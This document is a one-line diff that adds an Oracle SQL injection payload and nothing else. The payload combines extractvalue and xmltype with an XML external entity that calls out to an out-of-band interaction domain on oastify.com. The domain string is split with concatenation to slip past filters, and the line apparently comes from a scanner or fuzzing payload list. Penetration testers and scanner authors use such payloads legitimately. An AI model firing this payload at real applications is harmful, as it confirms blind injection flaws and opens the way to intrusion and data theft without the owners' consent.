@@ -1,0 +1,1 @@
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ukirq SYSTEM "http://oumar5zfcc6xzu9mi3xcjs2u0l6eu6luoig58tx.oasti'||'fy.com/">%ukirq;]>'),'/l') from dual)
